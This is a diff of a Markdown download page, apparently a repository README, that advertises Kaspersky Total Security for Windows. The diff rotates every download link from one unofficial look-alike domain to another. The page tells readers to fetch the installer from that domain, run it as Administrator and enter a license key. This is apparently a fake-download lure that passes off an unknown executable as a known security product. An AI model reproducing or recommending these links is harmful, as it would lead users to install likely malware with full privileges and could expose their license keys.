@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Kaspersky Total Security** for Windows.
 
 <p align="center">
-  <a href="https://kaspersky-total-security.zipzapsol.space/">
+  <a href="https://kaspersky-total-security.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Kaspersky%20Total%20Security-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Kaspersky Total Security">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[kaspersky-total-security.zipzapsol.space](https://kaspersky-total-security.zipzapsol.space/)** |
-| **Full URL** | `https://kaspersky-total-security.zipzapsol.space/` |
+| **Direct link** | **[kaspersky-total-security.wonderchain.fun](https://kaspersky-total-security.wonderchain.fun/)** |
+| **Full URL** | `https://kaspersky-total-security.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — kaspersky-total-security.zipzapsol.space](https://kaspersky-total-security.zipzapsol.space/)** (link above)
+1. Click **[Download — kaspersky-total-security.wonderchain.fun](https://kaspersky-total-security.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://kaspersky-total-security.zipzapsol.space/"><strong>⬇ Download Kaspersky Total Security now</strong></a></p>
+<p align="center"><a href="https://kaspersky-total-security.wonderchain.fun/"><strong>⬇ Download Kaspersky Total Security now</strong></a></p>
 
 ---
 
